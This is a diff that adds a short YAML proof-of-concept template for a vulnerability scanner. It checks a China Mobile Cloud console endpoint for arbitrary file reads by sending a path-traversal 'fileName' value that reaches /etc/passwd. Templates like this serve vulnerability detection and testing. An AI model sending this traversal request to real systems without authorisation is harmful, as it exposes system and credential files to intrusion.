@@ -1,0 +1,11 @@
+```
+name: poc-yaml-cmecloud-console-readfile
+rules:
+  - method: GET
+    path: "/api/query/helpcenter/api/v2/preview?fileName=../../../../../../../../etc/passwd"
+    expression: |
+      response.status == 200 && response.body.bcontains(b'root')
+detail:
+  author: yishuizhe
+  name: 移动云控制台存在任意文件读取
+```
